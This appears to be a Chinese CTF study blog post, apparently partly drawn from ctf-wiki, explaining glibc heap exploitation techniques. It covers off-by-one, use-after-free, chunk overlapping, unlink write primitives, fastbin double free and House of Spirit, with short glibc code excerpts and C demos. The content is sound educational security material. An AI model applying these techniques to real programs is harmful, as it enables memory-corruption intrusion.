<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
  </script>

  <meta name="description" content="记录下最近在ctf-wiki学习的一些堆溢出攻击相关的东西。有一些是从ctf-wiki的pwn部分cp来的，其中加入了一些自己看时的想法与版本矫正，方便理解与日后查阅。">
<meta property="og:type" content="article">
<meta property="og:title" content="堆溢出(3)-堆攻击手法">
<meta property="og:url" content="http://yoursite.com/2020/06/14/happyheap/index.html">
<meta property="og:site_name" content="sec4fun">
<meta property="og:description" content="记录下最近在ctf-wiki学习的一些堆溢出攻击相关的东西。有一些是从ctf-wiki的pwn部分cp来的，其中加入了一些自己看时的想法与版本矫正，方便理解与日后查阅。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/figure/unsorted_bin_attack_order.png">
<meta property="og:image" content="c:/Users/She11c4T/Desktop/堆溢出相关/houseoflore原理图.png">
<meta property="article:published_time" content="2020-06-14T14:31:48.000Z">
<meta property="article:modified_time" content="2020-06-21T13:22:36.000Z">
<meta property="article:author" content="ma5ker">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/figure/unsorted_bin_attack_order.png">


<link rel="canonical" href="http://yoursite.com/2020/06/14/happyheap/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>堆溢出(3)-堆攻击手法 | sec4fun</title>
  






  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">sec4fun</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-commonweal">

    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>

  </li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <section class="post-toc-wrap sidebar-panel">
          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E6%96%B9%E5%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">堆漏洞产生方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#heap-based-Off-by-one"><span class="nav-number">1.1.</span> <span class="nav-text">heap based Off-by-one</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Use-After-Free"><span class="nav-number">1.2.</span> <span class="nav-text">Use After Free</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">堆漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Chunk-Extend-and-Overlapping"><span class="nav-number">2.1.</span> <span class="nav-text">Chunk Extend and Overlapping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Unlink"><span class="nav-number">2.2.</span> <span class="nav-text">Unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A7%E7%9A%84unlink"><span class="nav-number">2.2.1.</span> <span class="nav-text">旧的unlink</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%B0%E6%9C%89unlink"><span class="nav-number">2.2.2.</span> <span class="nav-text">现有unlink</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fastbin-attack"><span class="nav-number">2.3.</span> <span class="nav-text">Fastbin attack</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Fastbin-Double-Free%EF%BC%88fastbin-dup%EF%BC%89"><span class="nav-number">2.3.1.</span> <span class="nav-text">Fastbin Double Free（fastbin dup）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#House-Of-Spirit"><span class="nav-number">2.3.2.</span> <span class="nav-text">House Of Spirit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Alloc-to-Stack"><span class="nav-number">2.3.3.</span> <span class="nav-text">Alloc to Stack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Arbitrary-Alloc"><span class="nav-number">2.3.4.</span> <span class="nav-text">Arbitrary Alloc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9-malloc-hook%E5%8A%AB%E6%8C%81%E6%8E%A7%E5%88%B6%E6%B5%81"><span class="nav-number">2.3.5.</span> <span class="nav-text">修改__malloc_hook劫持控制流</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Unsorted-Bin-Attack"><span class="nav-number">2.4.</span> <span class="nav-text">Unsorted Bin Attack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Large-Bin-Attack"><span class="nav-number">2.5.</span> <span class="nav-text">Large Bin Attack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tcache-attack"><span class="nav-number">2.6.</span> <span class="nav-text">Tcache attack</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache-poison"><span class="nav-number">2.6.1.</span> <span class="nav-text">tcache poison</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache-dup"><span class="nav-number">2.6.2.</span> <span class="nav-text">tcache dup</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#patch"><span class="nav-number">2.6.2.1.</span> <span class="nav-text">patch</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache-perthread-corruption"><span class="nav-number">2.6.3.</span> <span class="nav-text">tcache perthread corruption</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache-house-of-spirit"><span class="nav-number">2.6.4.</span> <span class="nav-text">tcache house of spirit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#smallchunk2tcache-unsafe-unlink"><span class="nav-number">2.6.5.</span> <span class="nav-text">smallchunk2tcache unsafe unlink</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache-stashing-unlink-attack"><span class="nav-number">2.6.6.</span> <span class="nav-text">tcache stashing unlink attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%83%85%E6%99%AF"><span class="nav-number">2.6.6.1.</span> <span class="nav-text">情景</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#libc-leak"><span class="nav-number">2.6.7.</span> <span class="nav-text">libc leak</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Tcache-Check"><span class="nav-number">2.6.8.</span> <span class="nav-text">Tcache Check</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-Of-Einherjar-glibc-2-28%E5%8F%8A%E4%BB%A5%E4%B8%8B%E5%8F%AF%E7%94%A8"><span class="nav-number">2.7.</span> <span class="nav-text">House Of Einherjar(glibc 2.28及以下可用)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#patch-1"><span class="nav-number">2.7.1.</span> <span class="nav-text">patch</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">2.7.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-Of-Force-glibc2-28%E5%8F%8A%E4%BB%A5%E4%B8%8B"><span class="nav-number">2.8.</span> <span class="nav-text">House Of Force( glibc2.28及以下)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.8.1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#patch-2"><span class="nav-number">2.8.2.</span> <span class="nav-text">patch</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Lore-%E5%85%A8%E7%89%88%E6%9C%AC%E5%8F%AF%E7%94%A8"><span class="nav-number">2.9.</span> <span class="nav-text">House of Lore(全版本可用?)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Rabbit-glibc2-26%E5%8F%8A%E4%BB%A5%E4%B8%8B"><span class="nav-number">2.10.</span> <span class="nav-text">House of Rabbit(glibc2.26及以下)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.10.1.</span> <span class="nav-text">原理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9chunk%E7%9A%84size"><span class="nav-number">2.10.1.1.</span> <span class="nav-text">修改chunk的size</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9chunk%E7%9A%84fd%E6%8C%87%E9%92%88"><span class="nav-number">2.10.1.2.</span> <span class="nav-text">修改chunk的fd指针</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Orange"><span class="nav-number">2.11.</span> <span class="nav-text">House of Orange</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Roman"><span class="nav-number">2.12.</span> <span class="nav-text">House of Roman</span></a></li></ol></li></ol></div>
      </section>
      <!--/noindex-->

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ma5ker"
      src="/images/head.jpg">
  <p class="site-author-name" itemprop="name">ma5ker</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">41</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">26</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/Ma5ker" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Ma5ker" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:kcahlb@gmail.com" title="E-Mail → mailto:kcahlb@gmail.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </section>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">
      

      

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/14/happyheap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/head.jpg">
      <meta itemprop="name" content="ma5ker">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sec4fun">
    </span>

    
    
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          堆溢出(3)-堆攻击手法
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-06-14 22:31:48" itemprop="dateCreated datePublished" datetime="2020-06-14T22:31:48+08:00">2020-06-14</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-06-21 21:22:36" itemprop="dateModified" datetime="2020-06-21T21:22:36+08:00">2020-06-21</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>45k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>41 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>记录下最近在ctf-wiki学习的一些堆溢出攻击相关的东西。有一些是从<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/">ctf-wiki</a>的pwn部分cp来的，其中加入了一些自己看时的想法与版本矫正，方便理解与日后查阅。</p>
<a id="more"></a>

<p>这部分虽然名字叫堆攻击手法， 其实是对整个堆(包括漏洞，以及攻击手法)的囊括。当然这部分笔记先暂时只看漏洞方式与攻击手法，具体实例之后再看。</p>
<p>个人觉得这部分应该分为两部分，一个是堆的几个典型漏洞产生方式；一个是利用这些漏洞进行攻击的手段或者说技巧。这种手段或者技巧主要来源于glibc管理的feature。其实堆利用的各种手法的产生过程就是一个阅读源码并发现其中为了提高效率亦或者疏忽大意导致未作细致的安全检查，然后总结条件以抽象出这种利用形式的过程。</p>
<h2 id="堆漏洞产生方式"><a href="#堆漏洞产生方式" class="headerlink" title="堆漏洞产生方式"></a>堆漏洞产生方式</h2><p>出现堆攻击是由于堆管理或者代码本身出现了问题。主要有以下几个</p>
<ul>
<li>堆溢出<ul>
<li>溢出多个字节</li>
<li>Off-by-one</li>
</ul>
</li>
<li>Use After Free</li>
</ul>
<h3 id="heap-based-Off-by-one"><a href="#heap-based-Off-by-one" class="headerlink" title="heap based Off-by-one"></a>heap based Off-by-one</h3><p>off-by-one就是溢出一个字节的漏洞，常常出现在下面两种情形下(其实可以归结为边界控制出现失误)</p>
<ul>
<li>循环边界次数错误</li>
<li>字符串拷贝溢出结束符<code>\x00</code><ul>
<li>最常见的 strlen计算字符串长度时不计算结束符 <code>&#39;\x00&#39;</code> ， strcpy 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，这样就造成了Off-by-one</li>
</ul>
</li>
</ul>
<p>以上这些Off-by-one很容易导致size的下一个chunk的最后一个字节被覆盖掉。而由前面对堆基础的学习，chunk的size字段中的后三位为三个标志位，其中最后一位prev_inuse标识了上一个块的使用情况</p>
<h3 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h3><p>字面意思就是一个内存被释放后又再次被使用。对一个内存进行free后主要有两种情况</p>
<ul>
<li>free后并将指针置为NULL，这就是正确的free操作</li>
<li>free后并将指针置为NULL，也就是dangling pointer<ul>
<li>在下一次使用前并没有再修改这个内存块，这种一般也能正常运行</li>
<li>在下一次使用前修改了这个内存块，当再次使用时就会出现问题</li>
</ul>
</li>
</ul>
<p>UAF只是提供了去写入一个被free的chunk的内容的能力，具体利用起来需要配合其他的利用手法。</p>
<ul>
<li>比如利用UAF去修改chunk的fd和bk进行unlink等。</li>
</ul>
<h2 id="堆漏洞利用"><a href="#堆漏洞利用" class="headerlink" title="堆漏洞利用"></a>堆漏洞利用</h2><p>下面是堆漏洞的利用技巧和利用手法。</p>
<h3 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h3><p>核心：通过更改第一个块的大小来控制第二个块的内容</p>
<ul>
<li><p>后向Overlapping</p>
<ul>
<li>fastbin的chunk进行extend<ul>
<li>增大第一个块的范围将第二个块包含进去，free的时候会合并成一个大的空闲chunk(fastbin中)</li>
<li>再将其申请回来，便可以直接控制 chunk2 中的内容，称为overlapping chunk</li>
</ul>
</li>
<li>对inuse中的small bin进行extend<ul>
<li>修改正在使用的chunk的size，将chunk2包含进去，free掉后下次malloc申请到chunk便可以完全控制chunk2</li>
</ul>
</li>
<li>对 free 的 small bin 进行 extend<ul>
<li>常见于free后指针未置为NULL，继续使用此指针更改此chunk的size部分，将其extend</li>
<li>被free的chunk会处于unsorted bin中，再次malloc回来就可以控制chunk2</li>
</ul>
</li>
</ul>
</li>
<li><p>前向Overlapping</p>
<ul>
<li>针对small bin中的chunk 修改 pre_inuse 域和 pre_size 域实现合并前面的多个块<ul>
<li>为啥是small chunk ，因为fastbin被free会直接放回对应的链，不存在unlink chunk这个过程</li>
<li>问题就在于：free时是通过pre_inuse判断前一个chunk是不是在使用，而并没有其他检查过程</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h3><p>Unlink方式利用了unlink_chunk函数在将chunk从chunk链上取出时的双链表操作检查的漏洞。</p>
<p>主要有两个内容：旧unlink和现有unlink方式。</p>
<h4 id="旧的unlink"><a href="#旧的unlink" class="headerlink" title="旧的unlink"></a>旧的unlink</h4><p>libc早期的unlink_chunk代码中对没有检查，unlink_chunk代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD &#x3D; p-&gt;fd;</span><br><span class="line">BK &#x3D; p-&gt;bk;</span><br><span class="line">FD-&gt;bk &#x3D; BK;</span><br><span class="line">BK-&gt;fd &#x3D; FD;</span><br></pre></td></tr></table></figure>

<p>这种情况下如果利用chunk1的堆溢出去覆盖chunk2的fd 和bk字段，而free掉chunk1的时候由于chunk2空闲，所以会将chunk2 unlink，然后与chunk1合并，但是这时候chunk2的fd和bk已经被修改了，假设fd被修改为target_addr，bk被修改为target_value， 根据unlink操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD &#x3D; p-&gt;fd;   -&gt; target_addr</span><br><span class="line">BK &#x3D; p-&gt;bk;   -&gt; target_value</span><br><span class="line">FD-&gt;bk &#x3D; BK;   -&gt;以target_addr作为chunk的bk偏移处内存被修改为target_value(任意地址读写)</span><br><span class="line">BK-&gt;fd &#x3D; FD;  --&gt; 以target_value作为chunk的fd偏移处内存被修改为target_addr(需要保证target_value这个地方可写)</span><br></pre></td></tr></table></figure>

<p>一般将target_addr设置为got表项，实现写got表，不过需要注意target_value作为chunk的fd偏移处内存需要可写，并且会被破坏，需要想办法绕过。</p>
<h4 id="现有unlink"><a href="#现有unlink" class="headerlink" title="现有unlink"></a>现有unlink</h4><p>这个unlink的检查缺陷在随后的版本被修复，加入了检查</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*检查双链表是不是正确的， 防止简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果  这也是原来unlink利用方式的原理*&#x2F;</span><br><span class="line">if (__builtin_expect (fd-&gt;bk !&#x3D; p || bk-&gt;fd !&#x3D; p, 0))</span><br><span class="line">  malloc_printerr (&quot;corrupted double-linked list&quot;);</span><br></pre></td></tr></table></figure>

<p>可以看到主要是</p>
<ul>
<li>判断了下一个chunk的bk指针是否指向当前的chunk</li>
<li>判断了上一个chunk的fd指针是否指向当前chunk</li>
</ul>
<p>看下通过验证的判定条件，如果将需要unlink的这个chunk的fd指向fd_chunk,bk指向bk_chunk，则需要满足</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd_chunk-&gt; bk &#x3D;&#x3D; chunk</span><br><span class="line">bk_chunk-&gt;fd &#x3D;&#x3D; chunk</span><br><span class="line">假设是32位,就是</span><br><span class="line">*(fd_chunk+12) &#x3D;&#x3D; chunk</span><br><span class="line">*(bk_chunk +8) &#x3D;&#x3D; chunk</span><br></pre></td></tr></table></figure>

<p>能满足以上这两个条件即可。之后就会执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(fd_chunk+12)&#x3D;bk_chunk</span><br><span class="line">*(bk_chunk+8)&#x3D;fd_chunk</span><br></pre></td></tr></table></figure>

<p>其实如果将fd_chunk+12和bk+8都指向一个存放指向chunk的指针，那么</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*chunk &#x3D; chunk -8</span><br><span class="line">*chunk &#x3D; chunk -12</span><br></pre></td></tr></table></figure>

<p>最后效果就是chunk处的指针指向了比他低12字节的地方，也就是chunk_ptr-12(32位情况下，64位就是chunk_ptr-0x18)。</p>
<p>触发情景(64位下)</p>
<ul>
<li>在UAF中时常出现修改 free的smallbin 中chunk或是 unsorted bin 的chunk的 fd 和 bk 指针</li>
<li>假设指向UAF chunk的指针的地址为 ptr</li>
<li>将其fd修改为 ptr - 0x18，bk修改为 ptr - 0x10</li>
<li>进行unlink</li>
<li>ptr 处的指针会变为 ptr - 0x18</li>
</ul>
<h3 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h3><p>包含所有基于fastbin机制的漏洞利用方式。往往通过堆溢出或者UAF等控制chunk内容的漏洞实现对fastbin类型的chunk的修改，以进行攻击。</p>
<p>细分</p>
<ul>
<li>Fastbin Double Free</li>
<li>House of Spirit</li>
<li>Alloc to Stack</li>
<li>Arbitrary Alloc</li>
</ul>
<h4 id="Fastbin-Double-Free（fastbin-dup）"><a href="#Fastbin-Double-Free（fastbin-dup）" class="headerlink" title="Fastbin Double Free（fastbin dup）"></a>Fastbin Double Free（fastbin dup）</h4><p>fastbin double free指的是对同一个fastbin chunk 进行多次的free操作。根据堆的基本知识可以了解到，fastbin 的每个chunk链都是单链表，而在free操作时，由于检查机制问题(如下)，只检查了当前chunk大小对应的那个chunk链的第一个chunk是否与当前chunk相同，防止double free.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">   add (i.e., double free).  */</span></span><br><span class="line"> <span class="comment">/*对fastbin的chunk进行free时，只检查了是不是其对应的chunk链的第一个chunk相同，并没有检查是不是与chunk链上的每一个chunk相同*/</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">p-&gt;fd = old2 = old;</span><br></pre></td></tr></table></figure>

<p>也就是说这样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1);  <span class="comment">//fastbin : chunk1</span></span><br><span class="line"><span class="built_in">free</span>(chunk1);  <span class="comment">//malloc_printerr (&quot;double free or corruption (fasttop)&quot;);</span></span><br></pre></td></tr></table></figure>

<p>而没有检查整个chunk链的每一个chunk，这就会导致double free后一个chunk链中存在多个相同的chunk。于是，可以在中间穿插chunk，构造如下，便可以成功触发fastbin上的double free</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1);  <span class="comment">//fastbin : chunk1</span></span><br><span class="line"><span class="built_in">free</span>(chunk2);  <span class="comment">// fastbin: chunk2-&gt;chunk1</span></span><br><span class="line"><span class="built_in">free</span>(chunk1);  <span class="comment">//fastbin： chunk1-&gt;chunk2-&gt;chunk1</span></span><br></pre></td></tr></table></figure>

<p>通过 fastbin double free ，可以达成多个指针控制同一个堆块，用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果可以进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (当然这里需要注意fastbin的index验证机制)，相当于任意地址写任意值的效果。</p>
<h4 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h4><p>在目标位置处伪造一个 fastbin chunk(伪造他的size部分)，并将其释放,此chunk会被放入到对应的 fastbin 链表，从而达到分配指定地址的 chunk 的目的。</p>
<p>根据前面阅读源码学习，free时对fastbin chunk的检查大概有下面几个：</p>
<ul>
<li>ISMMAP 位不能为1<ul>
<li>free 时，如果是 mmap得到的chunk会另外处理</li>
</ul>
</li>
<li>地址对齐 MALLOC_ALIGN_MASK</li>
<li>size 大小需要满足 fastbin 的需求，而且需要对齐<ul>
<li>szie位于fastbin范围，且满足对齐条件</li>
</ul>
</li>
<li>next chunk 的size不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code></li>
